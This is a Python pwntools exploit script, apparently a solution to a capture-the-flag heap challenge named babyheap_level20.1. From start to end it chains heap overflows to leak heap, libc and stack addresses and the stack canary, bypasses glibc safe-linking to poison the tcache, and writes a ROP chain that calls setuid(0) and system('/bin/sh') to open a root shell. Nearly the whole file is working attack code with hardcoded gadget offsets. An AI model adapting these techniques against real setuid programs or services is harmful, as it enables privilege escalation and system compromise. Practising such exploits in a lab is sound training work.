from pwn import * 

binary = './babyheap_level20.1_patched'
p = process(binary)
context.binary = binary
libc = ELF('./libc.so.6')
s = '''
b malloc
b free
b * main+386
'''

def start():
	p.sendline("malloc 0 24")
	p.sendline("malloc 1 24")
	p.sendline("safe_read 0")
	p.sendline(b'A' * 0x10 + p64(0) + p64(0x401))
	p.sendline("free 1")
	p.sendline("malloc 2 1010")

start()

p.sendline("safe_write 2")


leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 
leak = p.recvline() 






    
    



heap_addr = u64(leak[:8])
heap_addr = heap_addr << 12





p.sendline("safe_write 2")

libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))



libc_base = libc_addr - 0x21a6a0 
chunk_addr = heap_addr + 0x930



Libc_2_stack_leak = libc_base + 0x21aa20



mangled_ptr = ((chunk_addr >> 12 ) ^ (Libc_2_stack_leak))



start()
p.sendline("malloc 3 24")
p.sendline("malloc 4 24")
p.sendline("free 4")
p.sendline("free 3")
p.sendline("safe_read 2")

p.sendline(b'A' * 0x10 + p64(0) + p64(0x21) + p64(mangled_ptr))




p.sendline("malloc 3 24")
p.sendline("malloc 4 24") # the libc chunk to leak stack address

p.sendline("safe_write 4")


#p.recvuntil(b'\\', drop = False)
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()

leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()

leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()

leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()



leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()

leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()


leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()
leak_data = p.recvline()

leak_data = p.recvline()
leak_data = p.recvline()

leak_data = p.recvline()




stack_leak = u64(leak_data[:8])

rip = stack_leak - 0x110

before_canary = rip - 8 - 8 - 8 - 8 - 8 
print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", hex(stack_leak))
ROP_start = stack_leak - 0x198







mangled_ptr = (((chunk_addr+0x80) >> 12 ) ^ (before_canary))
start()
p.sendline("malloc 5 24")
p.sendline("malloc 6 24")
p.sendline("free 6")
p.sendline("free 5")
p.sendline("safe_read 2")



p.sendline(b'A' * 0x10 + p64(0) + p64(0x21) + p64(mangled_ptr))

p.sendline("malloc 5 24")
p.sendline("malloc 6 24") # the libc chunk to leak stack address

p.sendline("safe_write 6")

p.recvuntil(b'\x00', drop = False)

leak = p.recvline()
print(leak)


canary = u64(leak[23:31])  # Using pwntools u64 function
print(hex(canary))  # Should print 0x77c7d077b0912f00







mangled_ptr = (((chunk_addr+0x160) >> 12 ) ^ (ROP_start))
start()
p.sendline("malloc 7 828")
p.sendline("malloc 8 828")
p.sendline("free 8")
p.sendline("free 7")




p.sendline("safe_read 2")



p.sendline(b'A' * 0x10 + p64(0) + p64(0x351) + p64(mangled_ptr))




p.sendline("malloc 7 828")
p.sendline("malloc 8 828") # the libc chunk to leak stack address

p.sendline("safe_read 8")






# essential addresses
bin_sh_addr = libc_base + 0x1d8698

# gadgets

pop_rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 0x0000000000029139

offset = rip - ROP_start
payload = flat(
	# read
	b'A'* (offset - 8 - 8), # up to canary
	canary,
	b'B'*8, # old rbp
	
	
	# read 
	pop_rdi,
	0,
	libc_base + libc.sym['setuid'],
	ret,
	pop_rdi,
	bin_sh_addr,
	ret,
	libc_base + libc.sym['system']
	
	
)

p.sendline(payload)

#gdb.attach(p, s)
p.sendline("quit")
p.interactive()
